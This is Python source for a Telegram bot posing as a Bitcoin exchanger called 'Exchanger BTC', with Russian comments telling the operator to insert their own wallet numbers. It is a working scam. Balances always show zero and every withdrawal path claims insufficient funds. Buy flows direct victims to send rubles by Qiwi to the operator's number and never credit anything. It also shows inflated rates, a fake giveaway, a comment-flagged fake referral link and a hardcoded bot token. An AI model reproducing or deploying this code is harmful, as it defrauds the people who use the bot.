import random

import telebot
from telebot import types

from curs import bitprice
from curs import bitpriceUSD

qiwin = 1234 #Номер QIWI
btccoshel= 1234 #Номер BTC
token = "5699580658:AAEIX-HrhrOKFts4aFMQa9aS17gx7aCIGVc" # Токен бота

bot = telebot.TeleBot(token)

def log(message, answer):
    print('\n --------')
    from datetime import datetime
    print(datetime.now())
    print("Сообщение от {0} {1}. (id ={2}) \n Текст = {3}".format(message.from_user.first_name,
                                                                  message.from_user.last_name,
                                                                  str(message.from_user.id),
                                                                  message.text))
    print(answer)
#ZyzSoon

# САМ СКРИПТ БОТА | НУЖНО ИЗМЕНИТЬ НАЗВАНИЕ И НОМЕРА КОШЕЛЬКОВ. НЕ ЗАБУДЬ ИЗМЕНИТЬ ССЫЛКУ В "ПАРТНЕРАМ"

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_markup = telebot.types.ReplyKeyboardMarkup(True)
    user_markup.row('💼 Кошелек', '📊 Обмен BTC')
    user_markup.row('🚀 О сервисе', '📌 Акция')
    user_markup.row('👔 Партнерам')
    bot.send_message(message.from_user.id,
                     '💰<b>Exchanger BTC</b> - это моментальный обмен Bitcoin на Qiwi, Сбербанк, Яндекс.'
                     'Деньги и Webmoney, а так же бесплатное хранилище Ваших BTC.',
                     reply_markup=user_markup, parse_mode='HTML')


@bot.message_handler(content_types=['text'])
def handle_text(message):
    if message.text == "🚀 О сервисе":
        bot.send_message(message.from_user.id,
                         "<b>🚀 О сервисе</b> \n  \nСервис для обмена Bitcoin. \nПополняй внутренний кошелек с "
                         "помощью Qiwi или внешнего Bitcoin-кошелька.\n \n"
                         "Продавай эти BTC для вывода на Сбербанк, Яндекс.Деньги, Webmoney и Qiwi. Или выводи на свой "
                         "внешний Bitcoin-адрес.\n \n"
                         "У нас установлено ограничение минимального <b>(500 рублей)</b> и максмального <b>"
                         "(10 000 рублей)</b> единовременного платежа.",
                         parse_mode='HTML')
    if message.text == "📌 Акция":
        bot.send_message(message.from_user.id,
                         "<b>📌 Акция</b>" "\n \n<b>Exchanger BTC</b> проводит розыгрыш на <b>0.3 BTC</b>\n \n"
                         "Для участия в конкурсе надо лишь пользоваться нашим сервисом в период с <b>05.05.2022</b> до"
                         " <b>06.06.2022</b> и иметь остаток на балансе <b>0.0006 BTC.</b>\n \n"
                         "Этот остаток так же принадлежит Вам, это не плата за участие, после конкурса, даже в случае "
                         "победы, никакая комиссия взиматься не будет.\n \n"
                         "Опредление победителя будет проходить в прямой трансляции на площадке YouTube <b>5 июня "
                         "2022 года</b> в <b>20:00</b> по Московскому времени.\n \n"
                         "За 3 часа до начала Вам придет оповещение с ссылкой на трансляцию.", parse_mode='HTML')
    if message.text == "💼 Кошелек":
        keyboard = types.InlineKeyboardMarkup()
        callback_button = types.InlineKeyboardButton(text="📉 Вывести BTC", callback_data="📉 Вывести BTC")
        callback_button2 = types.InlineKeyboardButton(text="📈 Ввести BTC", callback_data="📈 Ввести BTC")
        keyboard.add(callback_button, callback_button2)
        bot.send_message(message.from_user.id, f"<b>💼 Кошелек BTC</b>\n \n"
                                               f"<b>Баланс:</b> 0.00 BTC\n"
                                               f"<b>Примерно:</b> 0 руб\n"
                                               f"<b>Заблокировано:</b> 0 BTC\n\n"
                                               f"За все время вами проведено <b>0</b> успешных сделок на общую сумму <b>0</b> BTC.\n\n"
                                               f"🤝 Приглашено: 0 пользователей\n💰 Заработано: 0 BTC\n\n",
                         parse_mode='HTML', reply_markup=keyboard)
    if message.text == "📊 Обмен BTC":
        keyboard4 = types.InlineKeyboardMarkup()
        callback_button6 = types.InlineKeyboardButton(text="📈 Купить", callback_data="📈 Купить")
        callback_button7 = types.InlineKeyboardButton(text="📉 Продать", callback_data="📉 Продать")
        keyboard4.add(callback_button6, callback_button7)
        bot.send_message(message.from_user.id, f"<b>📊 Обмен BTC</b>\n\n"
                                               f"✅ Вы находитесь в безопасном режиме. Его можно отключить после проведения 2х сделок.\n\n"
                                               f"⚠️ Напоминаем, что все комиссии должны быть включены в курс, покупатель должен отправлять точную сумму, как указанно в сделке!\n\n"
                                               f"<b>Биржевой курс:</b>\n"
                                               f'<pre>1 BTC = ' + str(bitprice + 100000) + ' RUB</pre>\n'
                                               f'<pre>1 BTC = ' + str(bitpriceUSD + 800) + ' USD</pre>',
                         parse_mode='HTML', reply_markup=keyboard4)
    if message.text == "👔 Партнерам":
        bot.send_message(message.from_user.id,
                         f"💵 Партнерская программа 🤝\n\n"
                         f"Приглашайте новых пользователей и получайте пассивный доход от комиссий бота! 💵\n\n"
                         f"Комиссия сервиса при обмене — 0,5%. Вы получаете 0,16% от суммы сделки если Ваш реферал совершает сделку откликаясь на объявление и 0,04% от суммы сделки если Ваш реферал создал объявление на которое откликнулся другой пользователь.\n\n"
                         f"Например: ваш подписчик проводит сделку на сумму 5 BTC, а вы получаете 0,008 BTC  дивидендов.\n\n"
                         f"Реферальная программа бессрочна, не имеет лимита приглашений и начинает действовать моментально.\n\n"
                         f"Для достижения высоких результатов, внимательно подходите к поиску целевой аудитории: привлекайте только тех, кто будет покупать или продавать криптовалюту.\n\n"
                         f"Используйте уникальную реферальную ссылку для приглашения пользователей. Чеки и ссылки на ваши объявления также являются реферальными.\n",
                         parse_mode='HTML')
        bot.send_message(message.from_user.id,
                         "\nhttps://t.me/Exchanger_BTCbot?start=80As346kMn") #ФЕЙКРЕФЕРАЛКА

    @bot.callback_query_handler(func=lambda c: True)
    def inline(c):
        if c.data == '📉 Вывести BTC':
            keyboard2 = types.InlineKeyboardMarkup()
            callback_button3 = types.InlineKeyboardButton(text="📈 Купить", callback_data="📈 Купить")
            keyboard2.add(callback_button3)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text='<b>📉 Вывести BTC</b>\n\n'
                     '⚠️У вас недостаточно BTC.\n'
                     'Мининимальная сумма вывода: 0,0005 BTC', parse_mode='HTML',
                reply_markup=keyboard2)

        if c.data == '📉 Продать':
            keyboard5 = types.InlineKeyboardMarkup()
            callback_button8 = types.InlineKeyboardButton(text="Qiwi", callback_data="Перевод")
            callback_button9 = types.InlineKeyboardButton(text="Сбербанк", callback_data="Перевод")
            callback_button10 = types.InlineKeyboardButton(text="WebMoney", callback_data="Перевод")
            callback_button11 = types.InlineKeyboardButton(text="Яндекс.Деньги", callback_data="Перевод")
            keyboard5.add(callback_button8, callback_button9, callback_button10, callback_button11)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text='<b>📉 Продать</b>\n\n'
                     'Продажа BTC осуществляется списыванием с Вашего внутреннего <b>Bitcoin-кошелька</b> и '
                     'последующая отправка рублей на выбранную Вами площадку.\n\n'
                     'Куда Вы хотите вывести <b>BTC</b>?', parse_mode='HTML',
                reply_markup=keyboard5)

        if c.data == 'Перевод':
            keyboard6 = types.InlineKeyboardMarkup()
            callback_button12 = types.InlineKeyboardButton(text="📈 Купить", callback_data="📈 Купить")
            keyboard6.add(callback_button12)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text='<b>⚠ У вас недостаточно BTC</b>\n'
                     'Минимальная сумма вывода:  0,0005 BTC', parse_mode='HTML', reply_markup=keyboard6)

        elif c.data == '📈 Ввести BTC':
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text=f'<b>📈 Внести BTC</b>\n \n'
                     f'Для пополнения BTC с внешнего кошелька используйте многоразовый адрес ниже.\n\n'
                     f'❕ Чтобы продать ваши BTC следует пополнить личный кошелек по адресу ниже.\n\n'
                     f'Средства поступают после 3-5 подтверждений сетью\n\n'
                     f'⚠️ Уважаемый пользователь, обращаем ваше внимание, что все вводы меньше 0.00005 BTC зачисляться в сервис не будут, возмещение по данным транзакциям так же не предусмотрено.\n'
                     f'Просьба учитывать данный факт при пополнении кошелька',
                parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>{btccoshel}</b>", parse_mode='HTML')

        if c.data == '📈 Купить':
            keyboard3 = types.InlineKeyboardMarkup()
            callback_button4 = types.InlineKeyboardButton(text="💵 Qiwi", callback_data="💵 Qiwi")
            callback_button5 = types.InlineKeyboardButton(text="💵 Bitcoin", callback_data="📈 Ввести BTC")
            keyboard3.add(callback_button4, callback_button5)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text='<b>📈 Купить</b>\n \n'
                     'Покупка BTC производится с помощью <b>Qiwi</b> или переводом на многоразовый '
                     '<b>Bitcoin-адрес</b> с внешнего кошелька.\n \n'
                     'Выберите способ пополнения', parse_mode='HTML',
                reply_markup=keyboard3
            )

        if c.data == '💵 Qiwi':
            keyboard7 = types.InlineKeyboardMarkup()
            callback_button13 = types.InlineKeyboardButton(text="500₽", callback_data="Перевод2")
            callback_button14 = types.InlineKeyboardButton(text="750₽", callback_data="Перевод3")
            callback_button15 = types.InlineKeyboardButton(text="1000₽", callback_data="Перевод4")
            callback_button16 = types.InlineKeyboardButton(text="2000₽", callback_data="Перевод5")
            callback_button17 = types.InlineKeyboardButton(text="3000₽", callback_data="Перевод6")
            callback_button18 = types.InlineKeyboardButton(text="4000₽", callback_data="Перевод7")
            callback_button19 = types.InlineKeyboardButton(text="5000₽", callback_data="Перевод8")
            callback_button20 = types.InlineKeyboardButton(text="6000₽", callback_data="Перевод9")
            callback_button21 = types.InlineKeyboardButton(text="7000₽", callback_data="Перевод10")
            callback_button22 = types.InlineKeyboardButton(text="8000₽", callback_data="Перевод11")
            callback_button23 = types.InlineKeyboardButton(text="9000₽", callback_data="Перевод12")
            callback_button24 = types.InlineKeyboardButton(text="10000₽", callback_data="Перевод13")
            keyboard7.add(callback_button13, callback_button14, callback_button15, callback_button16, callback_button17,
                          callback_button18,
                          callback_button19, callback_button20, callback_button21, callback_button22, callback_button23,
                          callback_button24)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text='<b>💵 Qiwi</b>\n \n'
                     'Выберите сумму в <b>RUB</b> которую хотите получить в <b>BTC</b>.\n'
                     'Для этого нажмите по одной из кнопок ниже. Максимальная сумма пополнения за раз - <b>'
                     '10 000 RUB</b>.\n \n'
                     'Курс обмена:\n'
                     '<pre>1 BTC = ' + str(bitprice + 100000) + ' RUB</pre>\n'
                                                                '<pre>1 BTC = ' + str(bitpriceUSD + 800) + ' USD</pre>',
                parse_mode='HTML', reply_markup=keyboard7)

        if c.data == 'Перевод2':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>500₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод3':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>750₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод4':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>1000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)), # QIWIНОМЕР
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод5':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>2000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)), # QIWIНОМЕР
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод6':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>3000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод7':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>4000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод8':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>5000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод9':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>6000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод10':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>7000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод11':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>8000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод12':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>9000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод13':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>10000₽</b> на номер, который будет указан ниже. \n\n"
                     "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, f"<b>Номер:</b> {qiwin}\n"
                                                f"<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                             parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Оплатил':
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="✅ <b>Отлично</b>\n\n"
                     "Если вы правильно произвели перевод, то течение пяти минут бот обработает его и зачислит"
                     " <b>BTC</b> на ваш счет. "
                     "Если же вы допустили ошибку при переводе, то напишите в службу поддержки @ZySoon. "
                     "Благодарим вас за выбор <b>Exchanger BTC</b>.\n", parse_mode='HTML')

        if c.data == 'Отказаться':
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="⚠ Вы можете приобрести <b>BTC</b> в любое другое время.\n", parse_mode='HTML')


if __name__ == '__main__':
    bot.polling(none_stop=True)
